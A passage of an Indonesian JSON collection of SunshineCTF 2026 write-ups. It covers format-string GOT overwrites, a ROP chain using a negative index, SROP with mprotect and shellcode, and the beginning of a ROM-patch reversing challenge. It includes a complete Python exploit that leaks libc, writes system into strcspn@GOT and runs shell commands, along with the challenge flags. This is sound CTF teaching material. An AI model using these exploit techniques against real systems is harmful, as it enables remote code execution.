    "problemDescription": "Temukan format-string vulnerability, gunakan positional argument untuk membaca alamat dinamis, hitung alamat `system`, lalu tulis alamat tersebut ke GOT.",
    "tools": [
      "file",
      "checksec",
      "GDB/pwndbg",
      "pwntools",
      "format-string analysis",
      "ELF/GOT analysis"
    ],
    "analysis": "Input pertama digunakan untuk membaca stack dan memperoleh alamat yang diperlukan. Dengan primitive `%n`/write yang didukung binary, solver menulis alamat `system` ke `printf@GOT`; input berikutnya kemudian diperlakukan sebagai command shell untuk membaca flag.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Binary menjalankan delapan kali `fgets()` ke buffer stack, lalu mencetak input memakai `printf(buffer)`. Input menjadi format string sehingga stack dapat dibaca dan GOT dapat ditulis."
      },
      {
        "title": "Proteksi Binary",
        "content": "`mad_libs` adalah ELF x86-64 PIE, dynamically linked, NX aktif, stack canary aktif, Partial RELRO, serta SHSTK dan IBT aktif. Binary stripped. Challenge menyediakan `libc.so.6` dan loader/dependency lokal."
      },
      {
        "title": "Analisis Program",
        "content": "Fungsi utama berada di offset `0x11c9`. Buffer berada pada `[rbp-0x110]`, berukuran 0x100 byte. Canary berada pada `[rbp-0x8]`. Alur input penting:\n\n```asm\nlea rax,[rbp-0x110]\nmov esi,0x100\ncall fgets\nlea rax,[rbp-0x110]\nmov rdi,rax\ncall printf\n```"
      },
      {
        "title": "Vulnerability",
        "content": "Pemanggilan `printf` langsung menggunakan input sebagai format string. Dengan `%p`, stack dapat dibaca. Karena Partial RELRO, `printf@GOT` di offset `0x4010` masih writable."
      },
      {
        "title": "Primitive",
        "content": "Pada binary dan libc yang disediakan:\n\n- `%47$p - 0x11c9` memberikan PIE base dari saved return address ke `main`.\n- `%43$p - 0x2a1ca` memberikan libc base.\n- `%41$p` adalah stack canary.\n- `printf@GOT = PIE base + 0x4010`.\n\nEmpat halfword write `%hn` dipakai untuk mengisi `printf@GOT` dengan `libc_base + system`. Penulisan 8-byte langsung tidak dipakai karena akan menimpa GOT `fgets` yang berada tepat setelah `printf@GOT`."
      },
      {
        "title": "Exploit Final",
        "content": "`solve.py` membaca leak pada input pertama, menghitung alamat dinamis, menulis alamat `system` ke `printf@GOT`, lalu menjalankan `cat /ctf/flag.txt` pada input berikutnya.\n\nJalankan lokal:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nJalankan remote:\n\n```bash\npython3 solve.py REMOTE HOST=chal.sunshinectf.org PORT=26001\n```"
      },
      {
        "title": "Hasil Verifikasi",
        "content": "Flag dari service remote:\n\n```text\nsun{f1ll_iN_th3_g0T_eNtry}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{f1ll_iN_th3_g0T_eNtry}",
    "lessonsLearned": "Jangan meneruskan input user sebagai format string. Gunakan format tetap seperti `printf(\"%s\", buffer)` dan aktifkan full RELRO untuk mengurangi dampak overwrite GOT."
  },
  {
    "id": "sunshinectf-pwn-print-print-revolution",
    "title": "Print Print Revolution",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Custom format renderer menyediakan positional read dan write yang menyerupai format string. Primitive tersebut digunakan untuk leak libc, menghitung `system`, lalu menimpa `strcspn@GOT`.",
    "problemDescription": "Pahami layout argumen renderer custom, gunakan `%9$s` untuk leak GOT dan `%9$w` untuk arbitrary QWORD write, kemudian trigger command execution melalui GOT overwrite.",
    "tools": [
      "file",
      "checksec",
      "GDB",
      "pwntools",
      "custom format-string analysis",
      "libc symbol lookup"
    ],
    "analysis": "Binary non-PIE membuat alamat GOT stabil. Leak `read@GOT` memberikan libc base, setelah itu `strcspn@GOT` ditimpa dengan `system`; ketika program membersihkan newline pada input berikutnya, pemanggilan tersebut berubah menjadi eksekusi command.",
    "solution": [
      {
        "title": "Flag",
        "content": "```text\nsun{cust0m_fmtstr_n0_t00ls_4ll0wed}\n```"
      },
      {
        "title": "Recon",
        "content": "Binary-nya jalan sebagai service prompt sederhana:\n\n```bash\nnc chal.sunshinectf.games 26002\n```\n\nOutput awal:\n\n```text\n=== PRINT PRINT REVOLUTION ===\nEnter your score card template:\nscore>\n```\n\nDari sisi program, input kita dipakai sebagai template untuk renderer custom. Ini bukan `printf()` libc langsung, jadi payload format string biasa tidak bisa diperlakukan 1:1 seperti bug printf standar.\n\nCek awal:\n\n```bash\nfile revolution\nchecksec revolution\nstrings -a revolution\n```\n\nBinary-nya non-PIE, jadi alamat `.got.plt` stabil. Ini penting karena exploit bisa langsung target GOT tanpa perlu leak base binary."
      },
      {
        "title": "Bug utama",
        "content": "Renderer custom punya fitur positional argument seperti:\n\n```text\n%9$s\n%9$w\n```\n\nDari testing, argumen format bisa kita kontrol lewat data yang ditaruh setelah string format di buffer input.\n\nLayout praktisnya:\n\n```text\narg6 = input[0:8]\narg7 = input[8:16]\narg8 = input[16:24]\narg9 = input[24:32]\n...\n```\n\nJadi kalau format string dibuat pendek lalu dipadding sampai offset `24`, QWORD setelahnya akan dibaca sebagai argumen ke-9.\n\nPrimitive yang dipakai:\n\n```text\n%9$s  -> baca string dari alamat yang kita taruh sebagai arg9\n%9$w  -> tulis QWORD ke alamat yang kita taruh sebagai arg9\n```\n\nEfeknya:\n\n```text\n%9$s\n```\n\nbisa jadi arbitrary read, cocok buat leak GOT.\n\nSedangkan:\n\n```text\n%9$w\n```\n\nbisa jadi arbitrary write QWORD, cocok buat overwrite GOT."
      },
      {
        "title": "Alamat penting",
        "content": "Karena binary non-PIE, alamat GOT stabil:\n\n```python\nGOTS = {\n    \"__libc_start_main\": 0x403fd8,\n    \"write\": 0x404000,\n    \"strlen\": 0x404008,\n    \"strcspn\": 0x404010,\n    \"read\": 0x404018,\n    \"setvbuf\": 0x404020,\n}\n```\n\nTarget akhir exploit:\n\n```text\nstrcspn@GOT -> system\n```\n\nAlasannya program akan balik ke prompt dan membaca input lagi. Biasanya setelah input, program membersihkan newline dengan fungsi seperti `strcspn(input, \"\\n\")`.\n\nKalau `strcspn` sudah diganti menjadi `system`, input berikutnya akan dianggap sebagai command shell."
      },
      {
        "title": "Leak libc",
        "content": "Awalnya sempat pakai libc lokal:\n\n```bash\nldd ./revolution\n```\n\nOutput lokal:\n\n```text\nlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6\n```\n\nTapi ketika dipakai ke remote, hasil base libc tidak page-aligned:\n\n```text\n[+] leaked read@libc : 0x7a9cc4355a50\n[+] libc base        : 0x7a9cc4239d30\n[!] WARNING: libc base tidak page-aligned.\n```\n\nBase libc valid harusnya berakhir `000`. Jadi libc lokal beda dari remote.\n\nKemudian leak beberapa GOT symbol dari remote:\n\n```text\n[+] leak write   @ 0x404000 = 0x769781dab560 low12=560\n[+] leak read    @ 0x404018 = 0x769781daaa50 low12=a50\n[+] leak setvbuf @ 0x404020 = 0x769781d17540 low12=540\n```\n\nAda beberapa leak yang tidak dipakai:\n\n```text\n__libc_start_main = 0x0\nstrlen            = 0x0\nstrcspn           = ...f70\n```\n\n`__libc_start_main` dan `strlen` hasilnya `0`, jadi tidak valid buat fingerprint libc.\n\n`strcspn` juga tidak dipakai buat lookup karena bisa resolve ke implementation IFUNC, bukan offset symbol publik yang cocok untuk database libc.\n\nLookup libc cukup pakai:\n\n```json\n{\n  \"symbols\": {\n    \"read\": \"a50\",\n    \"write\": \"560\",\n    \"setvbuf\": \"540\"\n  }\n}\n```\n\nDari `libc.rip`, kandidat yang cocok muncul sebagai libc Ubuntu 2.39. Kandidat pertama yang dipakai:\n\n```text\nlibc6_2.39-0ubuntu8.2_amd64\n```\n\nSetelah download libc remote, offset yang dipakai:\n\n```text\nread   offset = 0x11ba50\nsystem offset = 0x58740\n```\n\nLeak remote berikutnya menghasilkan base yang valid:\n\n```text\n[+] leaked read@libc : 0x736b9a9cda50\n[+] libc base        : 0x736b9a8b2000\n[+] system           : 0x736b9a90a740\n```\n\nBase-nya sudah page-aligned, jadi libc cocok."
      },
      {
        "title": "Exploit flow",
        "content": "Alur exploit final:\n\n1. Connect ke remote.\n2. Leak `read@GOT` dengan `%9$s`.\n3. Hitung libc base:\n\n   ```python\n   libc_base = leaked_read - read_offset\n   ```\n\n4. Hitung alamat `system`:\n\n   ```python\n   system_addr = libc_base + system_offset\n   ```\n\n5. Overwrite:\n\n   ```text\n   strcspn@GOT = system\n   ```\n\n6. Kirim command:\n\n   ```bash\n   cat flag.txt; cat /flag.txt; cat ./flag* 2>/dev/null\n   ```\n\n7. Service menjalankan command tersebut karena `strcspn()` sudah berubah jadi `system()`.\n\nOutput remote:\n\n```text\nsun{cust0m_fmtstr_n0_t00ls_4ll0wed}\ncat: /flag.txt: No such file or directory\nsun{cust0m_fmtstr_n0_t00ls_4ll0wed}\n```"
      },
      {
        "title": "Solver",
        "content": "```python\n#!/usr/bin/env python3\nimport argparse\nimport json\nimport os\nimport re\nimport socket\nimport struct\nimport subprocess\nimport sys\nimport time\nimport urllib.request\n\n\nBIN = \"./revolution\"\nPROMPT = b\"score> \"\n\nGOTS = {\n    \"__libc_start_main\": 0x403fd8,\n    \"write\": 0x404000,\n    \"strlen\": 0x404008,\n    \"strcspn\": 0x404010,\n    \"read\": 0x404018,\n    \"setvbuf\": 0x404020,\n}\n\nSTRCSPN_GOT = GOTS[\"strcspn\"]\n\n\ndef p64(x):\n    return struct.pack(\"<Q\", x & 0xffffffffffffffff)\n\n\ndef u64(x):\n    return struct.unpack(\"<Q\", x.ljust(8, b\"\\x00\")[:8])[0]\n\n\nclass IO:\n    def __init__(self, host=None, port=None, local=False, binary=BIN, timeout=5):\n        self.local = local\n        self.timeout = timeout\n\n        if local:\n            self.p = subprocess.Popen(\n                [binary],\n                stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                bufsize=0,\n            )\n            self.s = None\n        else:\n            self.s = socket.create_connection((host, port), timeout=timeout)\n            self.s.settimeout(timeout)\n            self.p = None\n\n    def send(self, data):\n        if self.local:\n            self.p.stdin.write(data)\n            self.p.stdin.flush()\n        else:\n            self.s.sendall(data)\n\n    def sendline(self, data):\n        self.send(data + b\"\\n\")\n\n    def recv_some(self, timeout=0.25):\n        if self.local:\n            import select\n\n            r, _, _ = select.select([self.p.stdout.fileno()], [], [], timeout)\n            if not r:\n                return b\"\"\n\n            try:\n                return os.read(self.p.stdout.fileno(), 4096)\n            except OSError:\n                return b\"\"\n\n        old = self.s.gettimeout()\n        self.s.settimeout(timeout)\n\n        try:\n            return self.s.recv(4096)\n        except socket.timeout:\n            return b\"\"\n        finally:\n            self.s.settimeout(old)\n\n    def recvuntil(self, token, timeout=5):\n        data = b\"\"\n        end = time.time() + timeout\n\n        while token not in data and time.time() < end:\n            chunk = self.recv_some(0.25)\n\n            if chunk:\n                data += chunk\n                continue\n\n            if self.local and self.p.poll() is not None:\n                break\n\n        return data\n\n    def recvall(self, timeout=3):\n        data = b\"\"\n        end = time.time() + timeout\n\n        while time.time() < end:\n            chunk = self.recv_some(0.25)\n\n            if chunk:\n                data += chunk\n                end = time.time() + timeout\n                continue\n\n            if self.local and self.p.poll() is not None:\n                break\n\n        return data\n\n    def close(self):\n        try:\n            if self.local:\n                self.p.kill()\n            else:\n                self.s.close()\n        except Exception:\n            pass\n\n\ndef run_cmd(cmd):\n    return subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode(errors=\"ignore\")\n\n\ndef get_symbol_offset(libc_path, name):\n    for cmd in ([\"readelf\", \"-Ws\", libc_path], [\"nm\", \"-D\", libc_path]):\n        try:\n            out = run_cmd(cmd)\n        except Exception:\n            continue\n\n        for line in out.splitlines():\n            if (\n                f\" {name}@@\" not in line\n                and f\" {name}@\" not in line\n                and not line.rstrip().endswith(f\" {name}\")\n            ):\n                continue\n\n            cols = line.split()\n\n            for c in cols:\n                if re.fullmatch(r\"[0-9a-fA-F]{6,16}\", c):\n                    return int(c, 16)\n\n    raise RuntimeError(f\"symbol {name} tidak ketemu di {libc_path}\")\n\n\ndef make_payload(fmt, args):\n    first_idx = 9\n    first_off = (first_idx - 6) * 8\n\n    if len(fmt) > first_off:\n        raise ValueError(\"format string kepanjangan\")\n\n    payload = fmt\n    payload += b\"A\" * (first_off - len(payload))\n    payload += b\"\".join(p64(x) for x in args)\n\n    return payload\n\n\ndef leak_qword(io, addr):\n    marker = b\"@@END@@\"\n    payload = make_payload(b\"%9$s\" + marker, [addr])\n\n    io.sendline(payload)\n    out = io.recvuntil(PROMPT, timeout=5)\n\n    if marker not in out:\n        print(\"[!] leak gagal. Output mentah:\")\n        print(out)\n        raise RuntimeError(\"marker tidak ketemu\")\n\n    raw = out.split(marker)[0]\n\n    if PROMPT in raw:\n        raw = raw.split(PROMPT)[-1]\n\n    return u64(raw), raw\n\n\ndef write_qword(io, addr, value):\n    payload = make_payload(b\"%9$w\", [addr, value])\n    io.sendline(payload)\n\n    return io.recvuntil(PROMPT, timeout=5)\n\n\ndef connect(args):\n    return IO(\n        host=args.host,\n        port=args.port,\n        local=args.local,\n        binary=args.binary,\n    )\n\n\ndef leak_remote_symbols(args):\n    io = connect(args)\n    banner = io.recvuntil(PROMPT, timeout=5)\n\n    if banner:\n        print(banner.decode(errors=\"replace\"), end=\"\")\n\n    leaks = {}\n\n    for name, addr in GOTS.items():\n        val, raw = leak_qword(io, addr)\n        leaks[name] = val\n        print(f\"[+] leak {name:<18} @ {hex(addr)} = {hex(val)} low12={val & 0xfff:03x}\")\n\n    io.close()\n\n    return leaks\n\n\ndef libc_rip_find(leaks):\n    # Jangan pakai leak 0.\n    # Jangan pakai strcspn karena bisa IFUNC implementation.\n    keep = (\"read\", \"write\", \"setvbuf\")\n\n    symbols = {\n        name: f\"{leaks[name] & 0xfff:x}\"\n        for name in keep\n        if leaks.get(name, 0) != 0\n    }\n\n    body = json.dumps({\"symbols\": symbols}).encode()\n\n    print(\"[*] libc.rip query:\")\n    print(json.dumps({\"symbols\": symbols}, indent=2))\n\n    req = urllib.request.Request(\n        \"https://libc.rip/api/find\",\n        data=body,\n        headers={\"Content-Type\": \"application/json\"},\n        method=\"POST\",\n    )\n\n    with urllib.request.urlopen(req, timeout=15) as r:\n        data = r.read()\n\n    results = json.loads(data.decode())\n\n    if not results:\n        raise RuntimeError(\"libc.rip tidak menemukan kandidat libc\")\n\n    print(f\"[*] kandidat libc: {len(results)}\")\n\n    for i, item in enumerate(results[:10]):\n        print(f\"    [{i}] {item.get('id')} buildid={item.get('buildid')}\")\n\n    return results[0]\n\n\ndef download_libc(candidate, outdir=\".\"):\n    url = candidate.get(\"download_url\")\n    libc_id = candidate.get(\"id\", \"remote_libc\")\n\n    if not url:\n        url = \"https://libc.rip/download/\" + libc_id\n\n    os.makedirs(outdir, exist_ok=True)\n\n    safe_id = re.sub(r\"[^a-zA-Z0-9_.+-]\", \"_\", libc_id)\n    path = os.path.join(outdir, safe_id + \".so\")\n\n    if os.path.exists(path):\n        print(f\"[*] libc sudah ada: {path}\")\n        return path\n\n    print(f\"[*] download libc: {url}\")\n    urllib.request.urlretrieve(url, path)\n    print(f\"[+] saved libc: {path}\")\n\n    return path\n\n\ndef exploit(args, libc_path):\n    read_off = get_symbol_offset(libc_path, \"read\")\n    system_off = get_symbol_offset(libc_path, \"system\")\n\n    print(f\"[*] libc       : {libc_path}\")\n    print(f\"[*] read off   : {hex(read_off)}\")\n    print(f\"[*] system off : {hex(system_off)}\")\n\n    io = connect(args)\n    banner = io.recvuntil(PROMPT, timeout=5)\n\n    if banner:\n        print(banner.decode(errors=\"replace\"), end=\"\")\n\n    read_leak, _ = leak_qword(io, GOTS[\"read\"])\n    libc_base = read_leak - read_off\n    system_addr = libc_base + system_off\n\n    print(f\"[+] leaked read@libc : {hex(read_leak)}\")\n    print(f\"[+] libc base        : {hex(libc_base)}\")\n    print(f\"[+] system           : {hex(system_addr)}\")\n\n    if libc_base & 0xFFF:\n        print(\"[!] base masih tidak page-aligned. Libc masih salah.\")\n        io.close()\n        return False\n\n    print(f\"[*] overwrite strcspn@GOT {hex(STRCSPN_GOT)} -> system\")\n    write_qword(io, STRCSPN_GOT, system_addr)\n\n    cmd = args.cmd.encode()\n    print(f\"[*] trigger command: {args.cmd}\")\n\n    io.sendline(cmd + b\"\\x00\")\n    out = io.recvall(timeout=4)\n\n    print(\"[+] output:\")\n    print(out.decode(errors=\"replace\"))\n\n    m = re.search(rb\"sun\\{[^}\\r\\n]+\\}\", out)\n\n    if m:\n        print()\n        print(f\"<FLAG>{m.group(0).decode()}</FLAG>\")\n        io.close()\n        return True\n\n    io.close()\n    return False\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\"--host\", default=\"chal.sunshinectf.games\")\n    parser.add_argument(\"--port\", type=int, default=26002)\n    parser.add_argument(\"--local\", action=\"store_true\")\n    parser.add_argument(\"--binary\", default=BIN)\n    parser.add_argument(\"--libc\", default=None)\n    parser.add_argument(\"--leak-only\", action=\"store_true\")\n    parser.add_argument(\"--no-auto-libc\", action=\"store_true\")\n    parser.add_argument(\n        \"--cmd\",\n        default=\"cat flag.txt; cat /flag.txt; cat ./flag* 2>/dev/null\",\n    )\n\n    args = parser.parse_args()\n\n    if args.local:\n        if not args.libc:\n            print(\"[!] local mode butuh --libc\")\n            print(\"    contoh: python3 solve.py --local --libc /lib/x86_64-linux-gnu/libc.so.6\")\n            sys.exit(1)\n\n        exploit(args, args.libc)\n        return\n\n    if args.libc:\n        exploit(args, args.libc)\n        return\n\n    leaks = leak_remote_symbols(args)\n\n    if args.leak_only:\n        print()\n        print(\"[*] leak-only selesai.\")\n        return\n\n    if args.no_auto_libc:\n        print(\"[!] --no-auto-libc aktif, berhenti setelah leak.\")\n        return\n\n    try:\n        candidate = libc_rip_find(leaks)\n        libc_path = download_libc(candidate, outdir=\".\")\n    except Exception as e:\n        print(f\"[!] auto libc lookup gagal: {e}\")\n        sys.exit(1)\n\n    ok = exploit(args, libc_path)\n\n    if not ok:\n        print(\"[!] exploit belum dapat flag. Kalau libc.rip kasih banyak kandidat, coba kandidat lain.\")\n\n\nif __name__ == \"__main__\":\n    main()\n```"
      },
      {
        "title": "Cara jalanin",
        "content": "Exploit final:\n\n```bash\npython3 solve.py --host chal.sunshinectf.games --port 26002\n```\n\nKalau libc sudah ter-download dan mau langsung pakai:\n\n```bash\npython3 solve.py --host chal.sunshinectf.games --port 26002 --libc ./libc6_2.39-0ubuntu8.2_amd64.so\n```"
      },
      {
        "title": "Output sukses",
        "content": "```text\n[+] output:\nsun{cust0m_fmtstr_n0_t00ls_4ll0wed}\ncat: /flag.txt: No such file or directory\nsun{cust0m_fmtstr_n0_t00ls_4ll0wed}\n\n<FLAG>sun{cust0m_fmtstr_n0_t00ls_4ll0wed}</FLAG>\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{cust0m_fmtstr_n0_t00ls_4ll0wed}",
    "lessonsLearned": "Renderer custom yang memberi akses baca/tulis berbasis positional argument tetap merupakan interpreter berbahaya. Batasi grammar dan jangan pernah memetakan token format ke arbitrary memory tanpa validasi ketat."
  },
  {
    "id": "sunshinectf-pwn-safe-house",
    "title": "Safe House",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Perintah `SUBMIT` memiliki stack overflow tanpa canary. ROP chain berkomunikasi dengan vault melalui file descriptor 3 dan memanfaatkan index negatif `-4` untuk membaca descriptor `flag.txt`.",
    "problemDescription": "Analisis protocol front desk–vault, hitung offset return address, lalu gunakan ROP untuk meminta data dari descriptor internal yang seharusnya tidak dapat diakses user.",
    "tools": [
      "file",
      "checksec",
      "GDB",
      "pwntools",
      "ROP analysis",
      "socketpair protocol analysis"
    ],
    "analysis": "Ukuran input dibatasi hanya oleh satu byte, bukan kapasitas buffer, sehingga saved RIP dapat ditimpa pada offset 72. Chain memanggil helper protocol dengan index `-4`, keluar dari array public notes menuju record system yang menyimpan descriptor file flag.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Exploit memanfaatkan stack overflow pada perintah `SUBMIT`, lalu memakai ROP untuk berbicara langsung dengan proses vault melalui fd 3. Index negatif `-4` keluar dari array public notes dan menunjuk ke descriptor `flag.txt` yang sudah dibuka vault.\n\nFlag yang diperoleh dari service remote:\n\n```text\n<FLAG>sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}</FLAG>\n```"
      },
      {
        "title": "Proteksi Binary",
        "content": "`file` menunjukkan ELF amd64 dynamically linked dan stripped. `checksec`:\n\n```text\nRELRO: Full RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x400000)\nSHSTK: Enabled\nIBT: Enabled\n```\n\nTidak ada libc atau loader khusus yang disediakan; binary memakai libc sistem. Binary mencantumkan SHSTK dan IBT pada metadata, tetapi service remote menerima chain yang digunakan. Writeup ini menyatakan observasi tersebut tanpa menggeneralisasikannya ke semua konfigurasi CET."
      },
      {
        "title": "Analisis Program",
        "content": "Program membuat `socketpair()` lalu `fork()`. Front desk memproses input pengguna dan berkomunikasi dengan child vault melalui fd 3. Vault membuka `flag.txt` sekali, lalu mengisi satu system slot dengan descriptor flag dan slot lain dengan `/dev/null`.\n\nRecord public dimulai di `0x4060b0`, sedangkan record system flag berada empat record sebelum alamat itu, yaitu index `-4`.\n\nProtocol internal memakai header 4 byte dan XOR key global. Helper binary `0x401d50` membentuk serta mengenkripsi request, sedangkan `0x401f70` menerima, mendekripsi, memvalidasi, dan mencetak response."
      },
      {
        "title": "Vulnerability",
        "content": "Fungsi `0x401ed0` menangani `SUBMIT`. Setelah parsing size, fungsi melakukan:\n\n```asm\nsub rsp, 0x40\n...\nmovzx edx, bl\nmov rsi, rsp\ncall read@plt\n```\n\nNilai size hanya dibatasi oleh satu byte (`bl`), bukan oleh ukuran buffer. Saved `rbx` berada pada offset 64 dan return address pada offset 72. Canary tidak ada, sehingga return address dapat dikontrol."
      },
      {
        "title": "Primitive dan Offset",
        "content": "Crash dengan cyclic pattern membuktikan return address dikontrol pada offset 72:\n\n```text\nbuffer:       0x00\nsaved rbx:    0x40\nreturn addr:  0x48 = 72\n```\n\nRegister gadget yang dipakai:\n\n```text\npop rdi ; ret       0x401529\npop rsi ; ret       0x401dd5\nread@plt            0x4011f4\nwrite@plt           0x401194\n```"
      },
      {
        "title": "Strategi Exploit",
        "content": "1. `SUBMIT 255` menulis payload ROP ke stack.\n2. Tiga pemanggilan `read(0, ...)`, masing-masing 3 byte, membentuk:\n   - `BSS` berisi string `3` untuk memanggil helper `RELAY`.\n   - `BSS+8 = fc ff ff ff`, yaitu integer signed `-4`.\n3. `strlen()` melalui helper `0x401c20` menghasilkan panjang 73 dan meninggalkan nilai itu di `rdx`.\n4. `0x401d50` dipanggil dengan `rdi=3`, `rsi=BSS+8`, sehingga mengirim request vault terenkripsi untuk operasi 3 dengan index `-4`.\n5. `0x401f70` dipanggil dengan string `3`. Ia mengirim header kedua yang harmless, menerima response pertama dari vault, mendekripsinya, lalu mencetak isi flag.\n\nIndex `-4` lolos pemeriksaan karena vault hanya memeriksa batas atas (`index > 15`). Perhitungan pointer signed kemudian mengarah ke system record yang menyimpan fd flag."
      },
      {
        "title": "Exploit Final",
        "content": "Jalankan lokal jika tersedia `flag.txt` di direktori challenge:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nJalankan terhadap service challenge:\n\n```bash\npython3 solve.py REMOTE HOST=chal.sunshinectf.games PORT=26007\n```\n\n`solve.py` menghitung alamat PLT dari ELF, menyinkronkan prompt, dan memakai alamat binary tetap karena PIE disabled."
      },
      {
        "title": "Hasil Verifikasi",
        "content": "Output remote memuat:\n\n```text\nsun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}",
    "lessonsLearned": "Validasi panjang harus dibandingkan dengan kapasitas buffer sebenarnya. Selain memory safety, isolasi descriptor dan validasi index harus dilakukan agar record internal tidak dapat dijangkau melalui nilai negatif."
  },
  {
    "id": "sunshinectf-pwn-total-recall",
    "title": "Total Recall",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Binary syscall-only membocorkan pointer stack dan menerima overflow hingga `0x400` byte. SROP digunakan untuk memanggil `mprotect` pada halaman stack, kemudian shellcode membaca flag.",
    "problemDescription": "Gunakan stack leak dan overwrite saved RIP untuk memicu `rt_sigreturn`, bangun sigreturn frame yang mengatur `mprotect`, lalu lompat ke shellcode di stack.",
    "tools": [
      "file",
      "checksec",
      "readelf",
      "objdump",
      "GDB",
      "pwntools",
      "SROP analysis"
    ],
    "analysis": "Read kedua dipaksa mengembalikan 15 byte agar `rax=15`, yaitu syscall `rt_sigreturn`. Frame SROP mengatur `rax=10`, alamat halaman stack, ukuran halaman, dan permission RWX; setelah stack executable, control flow berpindah ke shellcode.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Binary hanya berisi syscall langsung. Program membocorkan pointer stack, lalu melakukan `read` berukuran `0x400` ke buffer stack yang lebih kecil dari jarak ke saved return address. Exploit lokal memakai SROP untuk memanggil `mprotect` pada halaman stack, lalu menjalankan shellcode."
      },
      {
        "title": "Proteksi Binary",
        "content": "```text\nELF 64-bit x86-64, statically linked, stripped\nPIE: No PIE (0x400000)\nCanary: tidak ada\nRELRO: tidak ada\nNX: stack executable menurut checksec, tetapi mapping lokal menunjukkan stack rw-p\n```\n\nTidak ada dynamic loader atau libc eksternal. `readelf -l` menunjukkan hanya dua `LOAD`; binary tidak mempunyai `PT_GNU_STACK`."
      },
      {
        "title": "Analisis Program",
        "content": "Entry point `0x401000` memanggil `0x401016`, lalu `0x40104f`, kemudian exit.\n\n`0x401016` melakukan `write(1, rsp, 8)`, sehingga delapan byte pointer stack bocor. Setelah itu fungsi membaca 24 byte ke `rsp-0x40` dan return.\n\n`0x40104f` melakukan `read(0, rsp-0x80, 0x400)` lalu return. Pada saat fungsi ini dipanggil, destination berada di `S-0x88`, sedangkan saved return address berada di `S-8`; offset overflow adalah `0x80`."
      },
      {
        "title": "Vulnerability dan Primitive",
        "content": "Primitive yang terbukti:\n\n- stack leak delapan byte dari output awal;\n- overwrite saved RIP pada offset `0x80`;\n- fixed-address syscall gadgets karena non-PIE;\n- `read` kedua dapat dibuat mengembalikan 15 byte, sehingga `rax=15`;\n- syscall number 15 memicu `rt_sigreturn`."
      },
      {
        "title": "Strategi Exploit",
        "content": "`solve.py` mengirim 24 byte pertama, membaca leak, lalu menaruh chain berikut pada buffer kedua:\n\n1. return ke `0x401032`, yaitu `read(0, rsp-0x40, 0x18); ret`;\n2. mengirim tepat 15 byte sehingga `rax=15`;\n3. return ke syscall di `0x40102f` untuk SROP;\n4. frame SROP mengatur `rax=10`, `rdi=page(stack)`, `rsi=0x1000`, dan `rdx=7`;\n5. syscall di `0x401069` menjalankan `mprotect` RWX pada stack;\n6. `ret` menuju shellcode di buffer stack.\n\nLocal validation menghasilkan `LOCAL_OK` secara konsisten pada beberapa percobaan."
      },
      {
        "title": "Menjalankan",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\npython3 solve.py CMD='printf LOCAL_OK'\npython3 solve.py REMOTE HOST=chal.sunshinectf.games PORT=26003\n```\n\nMode `REMOTE` sudah diuji terhadap endpoint challenge yang diberikan. Flag kemudian dikonfirmasi dari shell challenge:\n\n```text\nsun{r3caLl_ev3Ry_reGist3r_sR0p}\n```"
      },
      {
        "title": "Hasil Verifikasi",
        "content": "Eksploit lokal terbukti, dan flag challenge adalah:\n\n```text\nsun{r3caLl_ev3Ry_reGist3r_sR0p}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{r3caLl_ev3Ry_reGist3r_sR0p}",
    "lessonsLearned": "Binary syscall-only tetap perlu mematuhi batas buffer dan kebijakan eksekusi memori. NX, seccomp, serta validasi ukuran input dapat memutus rantai exploit seperti ini."
  },
  {
    "id": "sunshinectf-reverse-flameon",
    "title": "FlameOn",
    "category": "Reverse",
    "difficulty": "Easy",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Patch BPS untuk ROM Super Mario World menambahkan routine 65C816 yang mengenkripsi data dengan XOR `0x5A`. Decoding payload menghasilkan marker flag yang harus dinormalisasi ke format `sun{...}`.",
    "problemDescription": "Parse patch BPS, petakan payload ke alamat ROM, baca routine dekripsi, dan XOR data terenkripsi dengan konstanta yang digunakan program.",
    "tools": [
      "BPS parser",
      "Python 3",
      "65C816 disassembly",
      "hex analysis"
    ],
    "analysis": "Routine di bank `$10` membaca data mulai `$8022`, XOR setiap byte dengan `0x5A`, dan berhenti pada null byte. Hasil literal memakai marker obfuscated `un{...}Z`; solver mengambil isi kurung kurawal dan menerapkan prefix flag SunshineCTF.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "`CTF.BPS` adalah patch BPS untuk ROM Super Mario World. Patch menambahkan kode\n65C816 di bank `$10`, lalu memasang beberapa `JSL` dari kode game. Kode baru\ntersebut mendekripsi data dengan XOR `0x5A`."
      },
      {
        "title": "File Challenge",
        "content": "- `CTF.BPS` — patch BPS, ukuran 140 byte.\n- `solve.py` — parser BPS dan extractor flag."
      },
      {
        "title": "Analisis Awal",
